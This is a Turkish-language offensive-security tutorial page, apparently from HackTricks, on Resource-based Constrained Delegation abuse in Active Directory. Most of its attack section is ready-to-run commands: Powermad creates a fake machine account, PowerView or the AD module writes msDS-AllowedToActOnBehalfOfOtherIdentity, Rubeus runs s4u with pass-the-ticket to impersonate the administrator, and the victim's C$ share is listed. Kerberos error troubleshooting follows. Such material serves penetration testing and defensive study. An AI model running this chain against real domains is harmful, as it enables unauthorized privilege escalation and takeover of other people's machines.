# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Resource-based Constrained Delegation Temelleri

Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerlik gösterir, ancak **bir nesneye** **bir makineye karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Resource-based Constrained Delegation **nesne üzerinde herhangi bir kullanıcıyı taklit etme yetkisini belirler**.

Bu durumda, kısıtlı nesne, herhangi bir kullanıcıyı taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir niteliğe sahip olacaktır.

Bu Kısıtlı Delegasyonun diğer delegasyonlardan önemli bir farkı, **makine hesabı üzerinde yazma izinlerine sahip** herhangi bir kullanıcının (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (Diğer Delegasyon türlerinde alan yöneticisi ayrıcalıkları gerekiyordu).

### Yeni Kavramlar

Kısıtlı Delegasyon'da, kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** bayrağının **S4U2Self** gerçekleştirmek için gerekli olduğu belirtilmişti. Ancak bu tamamen doğru değil.\
Gerçek şu ki, o değer olmadan bile, eğer bir **hizmet** (bir SPN'e sahipseniz) iseniz, herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz, ancak eğer **`TrustedToAuthForDelegation`** bayrağına sahipseniz, dönen TGS **Forwardable** olacaktır ve eğer o bayrağa sahip değilseniz, dönen TGS **Forwardable** **olmayacaktır**.

Ancak, **S4U2Proxy**'de kullanılan **TGS** **Forwardable DEĞİLSE**, temel bir **Kısıtlı Delegasyon** istismar etmeye çalışmak **çalışmayacaktır**. Ancak bir **Resource-Based kısıtlı delegasyonu** istismar etmeye çalışıyorsanız, bu **çalışacaktır**.

### Saldırı Yapısı

> Eğer bir **Bilgisayar** hesabı üzerinde **yazma eşdeğer ayrıcalıklarına** sahipseniz, o makinede **ayrılmış erişim** elde edebilirsiniz.

Saldırganın zaten **kurban bilgisayarı üzerinde yazma eşdeğer ayrıcalıklarına** sahip olduğunu varsayalım.

1. Saldırgan, bir **SPN**'ye sahip bir hesabı **ele geçirir** veya **oluşturur** (“Hizmet A”). Herhangi bir _Admin User_'ın başka bir özel ayrıcalığı olmadan **10 Bilgisayar nesnesi** (_MachineAccountQuota_) oluşturabileceğini ve bunlara bir **SPN** ayarlayabileceğini unutmayın. Bu nedenle, saldırgan sadece bir Bilgisayar nesnesi oluşturup bir SPN ayarlayabilir.
2. Saldırgan, kurban bilgisayar (ServiceB) üzerindeki **yazma ayrıcalığını** kullanarak **HizmetA'nın o kurban bilgisayar (ServiceB) üzerinde herhangi bir kullanıcıyı taklit etmesine izin verecek şekilde kaynak tabanlı kısıtlı delegasyonu yapılandırır**.
3. Saldırgan, **Service B'ye ayrıcalıklı erişimi olan bir kullanıcı** için Service A'dan Service B'ye **tam bir S4U saldırısı** gerçekleştirmek üzere Rubeus'u kullanır.
   1. S4U2Self (ele geçirilen/oluşturulan SPN'den): **Yönetici için bana bir TGS iste** (Forwardable DEĞİL).
   2. S4U2Proxy: Önceki adımda elde edilen **Forwardable DEĞİL TGS**'yi kullanarak **Yönetici**'den **kurban ana bilgisayara** bir **TGS** istemek.
   3. Forwardable DEĞİL bir TGS kullanıyor olsanız bile, Resource-based kısıtlı delegasyonu istismar ettiğiniz için bu **çalışacaktır**.
   4. Saldırgan, **ticket'ı geçirebilir** ve **kullanıcıyı taklit ederek kurban ServiceB'ye erişim elde edebilir**.

Alanınızdaki _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bir Bilgisayar Nesnesi Oluşturma

**[powermad](https://github.com/Kevin-Robertson/Powermad)** kullanarak alan içinde bir bilgisayar nesnesi oluşturabilirsiniz:
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kaynak Tabanlı Kısıtlı Delegasyonu Yapılandırma

**activedirectory PowerShell modülünü kullanarak**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Powerview Kullanımı**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U saldırısı gerçekleştirme

Öncelikle, `123456` şifresi ile yeni bir Bilgisayar nesnesi oluşturduk, bu yüzden o şifrenin hash'ine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, o hesap için RC4 ve AES hash'lerini yazdıracaktır.\
Şimdi, saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak sadece bir kez sorarak daha fazla hizmet için daha fazla bilet oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Delege edilemez**" adında bir özelliği olduğunu unutmayın. Eğer bir kullanıcının bu özelliği True ise, onu taklit edemezsiniz. Bu özellik bloodhound içinde görülebilir.

### Erişim

Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Administrator'dan kurban hostuna **bellekte** enjekte edecektir.\
Bu örnekte, Administrator'dan **CIFS** servisi için bir TGS talep edilmiştir, böylece **C$**'ye erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı hizmet biletlerini kötüye kullanma

[**mevcut hizmet biletlerini buradan öğrenin**](silver-ticket.md#available-services).

## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve yalnızca RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini (veya sadece rc4, aes128 ve aes256 hash'lerini sağlayın) verin. Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın zamanının DC'nin zamanından farklı olduğu ve kerberos'un düzgün çalışmadığı anlamına gelir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin giriş yapmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bu, şunları ifade edebilir:
  - Taklit etmeye çalıştığınız kullanıcı, istenen hizmete erişemiyor (çünkü onu taklit edemezsiniz veya yeterli ayrıcalıklara sahip değildir)
  - İstenen hizmet mevcut değil (eğer winrm için bir bilet isterseniz ama winrm çalışmıyorsa)
  - Oluşturulan fakecomputer, savunmasız sunucu üzerindeki ayrıcalıklarını kaybetti ve bunları geri vermeniz gerekiyor.

## Referanslar

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)


{{#include ../../banners/hacktricks-training.md}}
